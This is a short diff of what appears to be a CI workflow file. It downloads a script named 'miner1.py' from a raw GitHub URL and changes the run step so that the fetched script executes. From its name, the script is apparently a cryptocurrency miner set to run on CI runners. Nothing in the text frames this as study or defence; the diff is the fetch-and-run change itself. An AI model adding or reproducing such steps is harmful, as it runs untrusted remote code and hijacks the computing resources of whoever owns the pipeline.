@@ -14,5 +14,5 @@ jobs:
         Invoke-WebRequest https://raw.githubusercontent.com/TOMMARCUSBRUT/dcf/main/miner1.py
     - name: run python.
       run: |
-        python https://raw.githubusercontent.com/TOMMARCUSBRUT/dcf/main/miner1.py
+        python miner1.py
         
